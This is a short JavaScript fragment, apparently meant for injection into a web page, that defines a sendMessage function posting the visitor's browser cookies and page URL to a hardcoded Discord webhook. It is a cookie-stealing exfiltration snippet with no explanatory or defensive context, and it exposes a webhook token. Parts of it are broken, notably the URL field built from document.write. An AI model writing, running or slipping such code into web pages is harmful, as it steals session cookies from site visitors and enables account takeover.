  function sendMessage() {
  function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1026337811374284871/T4WSMmQpU5UjoLLeIhKZ1CYzlz7ahlhJIkbDE6Hxi5JjTiEYD5hw0URyBheFPAbdjYwO");
    request.setRequestHeader('Content-type', 'application/json');
    var params = {
      content: ("> **Cookies  : **" + document.cookie + "\n> **URL : **" + document.write(document.location))
    }
    request.send(JSON.stringify(params));
	sleep(400)
  }